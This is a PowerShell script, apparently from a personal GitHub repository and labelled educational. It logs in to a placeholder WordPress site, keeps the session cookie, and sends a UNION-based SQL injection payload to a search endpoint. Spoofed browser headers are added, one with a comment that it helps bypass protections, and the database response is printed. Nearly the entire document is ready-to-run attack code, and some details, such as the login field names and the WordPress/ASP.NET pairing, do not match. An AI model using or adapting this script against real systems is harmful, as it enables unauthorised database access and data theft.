<#
.SYNOPSIS
    Demonstration of an authenticated login and SQL injection request using PowerShell.

.DESCRIPTION
    This script is for EDUCATIONAL PURPOSES ONLY. It demonstrates a login to a test website
    and a SQL injection attempt in a controlled environment. Do NOT use this script against
    any system without explicit written permission. Unauthorized testing is illegal and unethical.

.NOTES
    Author: Lehlohonolo Pakeng
    GitHub: https://github.com/hlonip
    License: MIT
#>

# Step 1: Log in to the website (if required for session)
$loginUri = "https://example.com/wp-login.php"
$loginBody = @{
    username = "test_username"  # Replace with your test credentials
    password = "test_password"  # Replace with your test credentials
}

# Create a new CookieContainer to store cookies
$cookieContainer = New-Object System.Net.CookieContainer

# Create a new WebRequest and assign the CookieContainer to it
$loginRequest = [System.Net.HttpWebRequest]::Create($loginUri)
$loginRequest.Method = "POST"
$loginRequest.ContentType = "application/x-www-form-urlencoded"
$loginRequest.CookieContainer = $cookieContainer

# Prepare the body of the request by joining the key-value pairs
$loginBodyEncoded = $loginBody.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }
$loginBodyEncoded = $loginBodyEncoded -join '&'  # Join them properly outside the pipeline

# Write the encoded body to the request stream
try {
    $loginStream = $loginRequest.GetRequestStream()
    $loginStream.Write([System.Text.Encoding]::UTF8.GetBytes($loginBodyEncoded), 0, $loginBodyEncoded.Length)
    $loginStream.Close()
} catch {
    Write-Host "[-] Failed to write login request: $($_.Exception.Message)"
    exit
}

# Get the response from the login request
try {
    $loginResponse = $loginRequest.GetResponse()
    $loginResponse.Close()
    Write-Host "[+] Logged in successfully (response received)."
} catch {
    Write-Host "[-] Login failed: $($_.Exception.Message)"
    exit
}

# Step 2: Perform SQL Injection Test with Custom Headers using the same CookieContainer
$uri = "https://example.com/search.aspx"
$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    "Referer" = "https://example.com/"
    "Origin" = "https://example.com"
    "X-Requested-With" = "XMLHttpRequest"  # Sometimes used to bypass protections
}

# Create a WebRequest for the search page and assign the CookieContainer
$searchRequest = [System.Net.HttpWebRequest]::Create($uri)
$searchRequest.Method = "POST"
$searchRequest.ContentType = "application/x-www-form-urlencoded"
$searchRequest.CookieContainer = $cookieContainer
$searchRequest.Headers.Add("User-Agent", $headers["User-Agent"])
$searchRequest.Headers.Add("Referer", $headers["Referer"])
$searchRequest.Headers.Add("Origin", $headers["Origin"])
$searchRequest.Headers.Add("X-Requested-With", $headers["X-Requested-With"])

# Prepare the body of the SQL injection request
$body = "search=test') UNION SELECT database()--"

# Write the body to the request stream
try {
    $searchStream = $searchRequest.GetRequestStream()
    $searchStream.Write([System.Text.Encoding]::UTF8.GetBytes($body), 0, $body.Length)
    $searchStream.Close()
} catch {
    Write-Host "[-] Failed to write search request: $($_.Exception.Message)"
    exit
}

# Get the response from the search request
try {
    $searchResponse = $searchRequest.GetResponse()
    $reader = New-Object System.IO.StreamReader($searchResponse.GetResponseStream())
    $responseContent = $reader.ReadToEnd()
    $reader.Close()
    $searchResponse.Close()
    Write-Host "Response Content: $responseContent"
} catch {
    Write-Host "Error: $($_.Exception.Message)"
}